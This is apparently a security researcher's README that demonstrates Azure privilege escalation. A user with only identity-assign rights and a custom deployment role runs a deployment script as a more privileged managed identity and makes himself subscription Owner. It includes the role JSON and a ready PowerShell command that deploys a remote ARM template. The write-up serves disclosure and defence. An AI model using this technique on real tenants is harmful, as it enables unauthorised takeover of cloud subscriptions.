
![image](https://github.com/SecureHats/azure-misfit/assets/40334679/b9eb2782-dac0-4e1f-9252-cfaf346c3259)

# Project Miaow (Managed Identity Adds Owner)

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/256fe70f-02cc-469f-b264-bf942f156a47)


Mr. KFC Harland Sanders has `read` and `assign` permissions on the User-Assigned Managed Identity

### Custom Role User-Assigned Managed Identity User (custom role)  

> This role only gives permissions to `read` and `assign` a user-assigned managed identity to follow the least privilege
> 
```json
{
    "id": "/subscriptions/7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50/providers/Microsoft.Authorization/roleDefinitions/44e27d73-8dd7-4428-8bda-78406afb75c1",
    "properties": {
        "roleName": "Managed Identity Consumer",
        "description": "",
        "assignableScopes": [
            "/subscriptions/7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50"
        ],
        "permissions": [
            {
                "actions": [
                    "Microsoft.ManagedIdentity/userAssignedIdentities/*/read",
                    "Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action"
                ],
                "notActions": [],
                "dataActions": [],
                "notDataActions": []
            }
        ]
    }
}
```

The User Assigned Managed Identity `super-owner` has permission `User Access Administrator` on a specified scope, in this case the subscription level.

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/103fe92a-09c9-493b-9865-04fb3df40a94)


Mr. Harland has `Deployment Administrator` permissions on a resource group, and no further permissions within the subscription.

### Custom Role: Deployment Administrator (permissions to create deployment script)  

> This role has less permissions than a `contributor` to follow the least privilege principle.
> 
```json
{
  "roleName": "Deployment Administrator",
  "description": "Configure least privilege for the deployment principal in deployment script",
  "type": "customRole",
  "IsCustom": true,
  "permissions": [
    {
      "actions": [
        "Microsoft.Storage/storageAccounts/*",
        "Microsoft.ContainerInstance/containerGroups/*",
        "Microsoft.Resources/deployments/*",
        "Microsoft.Resources/deploymentScripts/*"
      ],
    }
  ],
  "assignableScopes": [
    "[subscription().id]"
  ]
}
```

Harland has no access to the Resource group where the user assigned managed identity resides nor any other resources groups and resources in Azure.

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/68a01789-dace-4a1a-9808-49c10d8f9bbe)

Interesting note: when requesting the permissions of Mr. Harland via PowerShell, only the `Resource Group` permissions are shown.
The custom role assignment to the `user-assigned` are *not* displayed.

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/016957aa-92db-4b5d-a881-3c372ecb9ed4)


>
>   

## Proof Of Concept

1. Mr. Harland logs in to Azure PowerShell to deploy the template.

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/c977cd5b-e21a-4e43-9d82-40b14a385fce)

2. Deploys an ARM template to the designated resource group that contains a deployment script

```PowerShell
New-AzResourceGroupDeployment `
  -name miaow `
  -ResourceGroupName kentucky-fried-veggies `
  -TemplateObject ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/azuredeploy.json').Content | ConvertFrom-Json -AsHashtable) `
  -managedIdentityName 'super-owner' `
  -managedIdentityResourceGroup "azure-misfit" `
  -principalId "301dfac7-8f45-48ac-9868-e1f0e875385c"
```

> NOTE: I am invoking the ARM template from GitHub so the repository does not need to be cloned to execute the deployment.

### Provided parameters
```yaml
name:                         The display name of the deployment to the Azure Resource Group
ResourceGroupName:            The name of the resource group which the user has access to
TemplateObject:               The ARM template to deploy to the target resource group.
managedIdentityName:          The name of the managed identity with role assignment permissions on a scope
managedIdentityResourceGroup: The resource group where the managed identity resides
principalId:                  The objectId of the user that is granted permissions via the deployment script
```

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/2e2ec2e8-e3a2-4cef-b474-9734a7f481c9)

During the deployment in the target resource group, a storage account, container instance and deploymentScript resource is created.  

The script in the DeploymentScript is executed in the context of the use assigned managed identity.  
After completion the DeploymentScript will show `Miaow`

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/403a0076-d2ab-4540-9715-f5c022f641c8)

# We are now `OWNER` of the subscription

![image](https://github.com/SecureHats/azure-misfit/assets/40334679/e70829d3-afd9-4e7e-9cb0-ea68185576be)




